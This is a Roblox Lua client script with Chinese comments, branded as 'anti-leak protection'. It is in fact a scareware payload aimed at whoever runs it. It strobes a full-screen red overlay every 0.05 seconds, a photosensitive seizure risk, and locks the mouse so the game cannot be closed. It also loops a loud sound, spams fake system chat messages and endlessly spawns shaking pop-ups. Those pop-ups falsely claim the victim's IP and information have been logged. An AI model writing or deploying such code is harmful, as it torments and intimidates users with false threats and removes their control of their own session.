local players = game:GetService("Players")
local runService = game:GetService("RunService")
local userInputService = game:GetService("UserInputService")
local localPlayer = players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

-- 建立最外層 UI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "System_AntiLeak_Protection_Ultimate"
screenGui.IgnoreGuiInset = true -- 覆蓋全螢幕，包含上方黑條
screenGui.ResetOnSpawn = false
screenGui.DisplayOrder = 999999 -- 確保蓋在所有遊戲 UI 的最上層
screenGui.Parent = playerGui

-- 隨機數產生器
local random = Random.new()

-- ==================== 【加料 1：全螢幕血紅致盲背景】 ====================
local blindBg = Instance.new("Frame")
blindBg.Size = UDim2.new(1, 0, 1, 0)
blindBg.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
blindBg.BackgroundTransparency = 0.7
blindBg.BorderSizePixel = 0
blindBg.ZIndex = 10 -- 放在視窗下面，但蓋住遊戲畫面
blindBg.Parent = screenGui

task.spawn(function()
    while blindBg and blindBg.Parent do
        blindBg.BackgroundTransparency = 0.5
        task.wait(0.05)
        blindBg.BackgroundTransparency = 0.85
        task.wait(0.05)
    end
end)

-- ==================== 【加料 2：強制鎖定滑鼠在螢幕中央】 ====================
-- 讓對方完全無法移動滑鼠去點擊關閉遊戲或點擊外掛選單
local mouseConnection
mouseConnection = runService.RenderStepped:Connect(function()
    if not screenGui or not screenGui.Parent then
        mouseConnection:Disconnect()
        return
    end
    -- 將滑鼠位置強制鎖定（需配合滑鼠行為設定）
    userInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
end)

-- ==================== 音效設定 ====================
local SOUND_ID = "rbxassetid://5476307813" 

local function playHarshSound()
    local sound = Instance.new("Sound")
    sound.SoundId = SOUND_ID
    sound.Volume = 10
    sound.Looped = true
    sound.PlaybackSpeed = random:NextNumber(0.9, 1.5) 
    sound.Parent = game:GetService("SoundService")
    sound:Play()
end

-- ==================== 【加料 3：本地聊天室瘋狂洗版】 ====================
local function spamChat()
    task.spawn(function()
        local textChatService = game:GetService("TextChatService")
        -- 判斷是新版還是舊版聊天系統
        if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local generalChannel = textChatService:FindFirstChild("RBXGeneral", true)
            if generalChannel then
                while task.wait(0.1) do
                    generalChannel:DisplaySystemMessage("<font color='#FF0000'><b>[SYSTEM] DETECTED DATA LEAK! ACCESS DENIED!</b></font>")
                end
            end
        else
            local starterGui = game:GetService("StarterGui")
            while task.wait(0.1) do
                pcall(function()
                    starterGui:SetCore("ChatMakeSystemMessage", {
                        Text = "⚠️ [ANTI-LEAK] ILLEGAL ACTIVITY DETECTED! ⚠️",
                        Color = Color3.fromRGB(255, 0, 0),
                        Font = Enum.Font.SourceSansBold,
                        TextSize = 18
                    })
                end)
            end
        end
    end)
end

-- ==================== UI 生成核心 ====================
local function createWarningWindow()
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 360, 0, 190)
    frame.Position = UDim2.new(random:NextNumber(0.05, 0.7), 0, random:NextNumber(0.05, 0.7), 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BorderSizePixel = 4
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
    frame.ZIndex = 100
    frame.Parent = screenGui

    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 8)
    uiCorner.Parent = frame

    -- 警告主要文字（加上更具威脅性的排版）
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = "⚠️ CRITICAL ERROR ⚠️\n\n[偵測到非法外洩資料]\n\nYOUR IP AND INFOMATION\nHAS BEEN LOGGED."
    textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    textLabel.TextSize = 20
    textLabel.Font = Enum.Font.Code
    textLabel.ZIndex = 101
    textLabel.Parent = frame

    task.spawn(playHarshSound)

    -- 1. 【高頻劇烈抖動】
    local basePosition = frame.Position
    local shakeConnection
    shakeConnection = runService.RenderStepped:Connect(function()
        if not frame or not frame.Parent then 
            shakeConnection:Disconnect() 
            return 
        end
        local offsetX = random:NextNumber(-12, 12)
        local offsetY = random:NextNumber(-12, 12)
        frame.Position = UDim2.new(basePosition.X.Scale, basePosition.X.Offset + offsetX, basePosition.Y.Scale, basePosition.Y.Offset + offsetY)
    end)

    -- 2. 【紅黑劇烈閃爍】
    task.spawn(function()
        while frame and frame.Parent do
            frame.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
            textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            task.wait(0.05)
            frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
            task.wait(0.05)
        end
    end)

    -- 3. 【無規則隨機亂跳】
    task.spawn(function()
        while frame and frame.Parent do
            task.wait(random:NextNumber(0.1, 0.35))
            basePosition = UDim2.new(random:NextNumber(0.01, 0.75), 0, random:NextNumber(0.01, 0.75), 0)
        end
    end)
end

-- ==================== 觸發與連鎖複製邏輯 ====================

-- 啟動洗版
spamChat()

-- 立刻彈出第一個
createWarningWindow()

-- 隔 3 秒後開啟地毯式連鎖轟炸
task.delay(3, function()
    while task.wait(0.3) do -- 複製速度提升到 0.3 秒一個
        createWarningWindow()
    end
end)
